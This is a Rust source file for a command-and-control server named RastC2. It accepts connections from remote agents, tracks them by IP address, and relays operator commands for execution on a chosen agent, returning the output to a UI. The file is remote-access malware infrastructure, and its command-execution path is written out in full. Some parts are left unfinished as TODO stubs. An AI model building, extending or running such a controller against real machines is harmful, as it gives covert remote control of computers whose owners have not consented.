//! C2 implementation.

use std::{
    collections::HashMap,
    net::SocketAddr,
    ops::{DerefMut},
    sync::Arc,
    vec,
};

use anyhow::{Error, Result};
use bidirectional_channel::{ReceivedRequest};
use bytes::Bytes;
use futures_util::{sink::SinkExt, stream::StreamExt};
use rast::{
    messages::{
        c2_agent::{AgentMessage, AgentResponse, C2Request},
        ui_request::*,
    },
    protocols::{tcp::TcpFactory, *},
    settings::Settings,
};
use tokio::{
    sync::{
        mpsc::{unbounded_channel, UnboundedReceiver},
        Mutex,
    },
    task::JoinHandle,
};
use tokio_util::codec::{BytesCodec};
use tracing::{info};

use crate::c2::ui_manager::UiManager;

mod ui_manager;

#[derive(Debug)]
pub enum Dummy {
    Nothing,
}

// TODO: implement
pub enum C2Notification {
    AgentConnected(SocketAddr),
    AgentDisconnected(SocketAddr),
}

#[derive(Debug)]
pub struct RastC2 {
    servers: Vec<JoinHandle<()>>,
    connections: HashMap<SocketAddr, Arc<Mutex<dyn ProtoConnection>>>,
    connections_rx: UnboundedReceiver<Arc<Mutex<dyn ProtoConnection>>>,
    ui: Option<UiManager>,
}

impl RastC2 {
    pub async fn with_settings(settings: Settings) -> Result<Self> {
        let (ctx, crx) = unbounded_channel();
        let mut servers = vec![];

        if let Some(conf) = &settings.server.tcp {
            let server = TcpFactory::new_server(conf).await?;
            let cloned = ctx.clone();
            let task = tokio::spawn(async move {
                loop {
                    if let Ok(conn) = server.get_conn().await {
                        cloned.send(conn);
                    }
                }
            });
            servers.push(task);
        }

        let ui = if let Some(conf) = &settings.server.ui {
            let ui = UiManager::with_settings(conf).await?;
            Some(ui)
        } else {
            None
        };

        if servers.is_empty() {
            return Err(Error::msg("No servers running."));
        }

        let rastc2 = RastC2 {
            servers,
            connections: HashMap::new(),
            connections_rx: crx,
            ui,
        };

        info!("RastC2 instance created");

        Ok(rastc2)
    }

    pub async fn run(&mut self) -> Result<()> {
        info!("RastC2 instance running");
        loop {
            while let Ok(conn) = self.connections_rx.try_recv() {
                info!("Received agent connection");
                self.add_connection(conn).await?;
            }

            if let Some(ui) = &self.ui {
                while let Ok(req) = ui.try_recv_request() {
                    info!("Received UI request");
                    self.handle_ui_request(req).await;
                }
            }
        }
    }

    #[tracing::instrument]
    async fn add_connection(&mut self, conn: Arc<Mutex<dyn ProtoConnection>>) -> Result<()> {
        let ip = conn.lock().await.get_ip()?;
        self.connections.insert(ip, conn);
        Ok(())
    }

    async fn handle_ui_request(&self, req: ReceivedRequest<UiRequest, UiResponse>) -> Result<()> {
        info!("{:?}", req.as_ref());
        let response = match req.as_ref() {
            UiRequest::Ping => UiResponse::Pong,
            UiRequest::GetIps => {
                let ips = self.connections.keys().map(|ip| ip.to_string()).collect();
                UiResponse::GetIps(ips)
            },
            UiRequest::GetIpData(ip) => {
                // let _conn = self.connections.get(todo!());
                let ipdata = IpData { ip: *ip };
                UiResponse::GetIpData(ipdata)
            },
            UiRequest::Command(ip, cmd) => {
                let conn = self.connections.get(ip).unwrap();
                let mut conn = conn.lock().await;

                // TODO: put all of that into struct and do abstractions
                let mut frame = get_rw_frame(conn.deref_mut(), BytesCodec::new());

                let request = AgentMessage::C2Request(C2Request::ExecCommand(cmd.to_string()));
                let request = serde_json::to_vec(&request)?;

                let _result = frame.send(Bytes::from(request)).await;
                let bytes = frame.next().await.unwrap().unwrap();

                let output = serde_json::from_slice(bytes.as_ref());
                let output = output?;
                let AgentMessage::AgentResponse(AgentResponse::CommandResponse(output)) = output
                else {
                    todo!()
                };

                UiResponse::Command(output)
            },
        };
        info!("{:?}", response);
        let _result = req.respond(response);
        Ok(())
    }
}
